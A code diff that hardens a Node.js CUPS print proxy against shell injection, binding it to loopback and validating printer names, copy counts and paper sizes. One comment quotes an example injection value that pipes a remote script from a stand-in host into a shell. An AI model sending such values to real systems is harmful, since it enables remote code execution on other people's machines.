@@ -17,12 +17,19 @@
 import http from "node:http"
 import https from "node:https"
 import crypto from "node:crypto"
-import { execSync, exec } from "node:child_process"
+import { execSync, execFileSync, exec } from "node:child_process"
 import fs from "node:fs"
 import path from "node:path"
 import os from "node:os"
 
 const PORT = parseInt(process.env.PORT || "3001", 10)
+
+// Bind to loopback only. This proxy has no authentication and the CORS policy
+// is `*`, so binding 0.0.0.0 (the previous behaviour of listen(PORT)) exposed
+// the print endpoint to everyone on the same network. The documented usage is
+// a browser on this same machine. Set PRINT_PROXY_HOST=0.0.0.0 to opt back in
+// if a station really does need to reach it over the LAN.
+const HOST = process.env.PRINT_PROXY_HOST || "127.0.0.1"
 
 // macOS CUPS lp can't parse text/html — we render HTML to PDF first via
 // headless Chrome, then send the PDF to lp (it accepts application/pdf).
@@ -66,10 +73,26 @@ function detectPrinters() {
   }
 }
 
+// Every value below reaches a shell command line, so constrain both at the
+// boundary. Requiring `printer` to name a printer CUPS actually knows about is
+// both the correct semantic check and what blocks shell metacharacters -- a
+// name like `x; curl evil.sh | sh` simply isn't in lpstat's output.
+function resolvePrinter(name) {
+  if (typeof name !== "string") return null
+  return detectPrinters().some((p) => p.name === name) ? name : null
+}
+
+// CUPS option values (media sizes etc.) are alphanumeric plus . _ -
+const SAFE_OPTION_VALUE = /^[A-Za-z0-9_.-]+$/
+
 // Get printer options
 function getPrinterOptions(printerName) {
   try {
-    const output = execSync(`lpoptions -p ${printerName} -l 2>/dev/null`, { encoding: "utf8" })
+    // execFileSync, not execSync: no shell, so printerName cannot inject.
+    const output = execFileSync("lpoptions", ["-p", printerName, "-l"], {
+      encoding: "utf8",
+      stdio: ["ignore", "pipe", "ignore"],
+    })
     const options = {}
     for (const line of output.split("\n")) {
       const match = line.match(/^(\w+)\/.*:\s+(.+)/)
@@ -148,6 +171,11 @@ const handler = async (req, res) => {
       res.end(JSON.stringify({ error: "printer query param required" }))
       return
     }
+    if (!resolvePrinter(printerName)) {
+      res.writeHead(400, { "Content-Type": "application/json" })
+      res.end(JSON.stringify({ error: "Unknown printer" }))
+      return
+    }
     const options = getPrinterOptions(printerName)
     res.writeHead(200, { "Content-Type": "application/json" })
     res.end(JSON.stringify({ printer: printerName, options }))
@@ -180,6 +208,24 @@ const handler = async (req, res) => {
     if (!printer || !html) {
       res.writeHead(400, { "Content-Type": "application/json" })
       res.end(JSON.stringify({ error: "printer and html are required" }))
+      return
+    }
+
+    // printer, copies and paperSize are interpolated into `lp` command lines
+    // below. Validate all three here so no shell metacharacter can reach them.
+    if (!resolvePrinter(printer)) {
+      res.writeHead(400, { "Content-Type": "application/json" })
+      res.end(JSON.stringify({ error: "Unknown printer" }))
+      return
+    }
+    if (!Number.isInteger(copies) || copies < 1 || copies > 50) {
+      res.writeHead(400, { "Content-Type": "application/json" })
+      res.end(JSON.stringify({ error: "copies must be an integer between 1 and 50" }))
+      return
+    }
+    if (paperSize !== undefined && !SAFE_OPTION_VALUE.test(String(paperSize))) {
+      res.writeHead(400, { "Content-Type": "application/json" })
+      res.end(JSON.stringify({ error: "Invalid paperSize" }))
       return
     }
 
@@ -313,10 +359,10 @@ const HTTPS_PORT = PORT + 1 // 3002
 let httpsServer = null
 if (tlsCert) {
   httpsServer = https.createServer(tlsCert, handler)
-  httpsServer.listen(HTTPS_PORT)
+  httpsServer.listen(HTTPS_PORT, HOST)
 }
 
-httpServer.listen(PORT, () => {
+httpServer.listen(PORT, HOST, () => {
   const printers = detectPrinters()
   console.log(`
 ╔══════════════════════════════════════════════╗
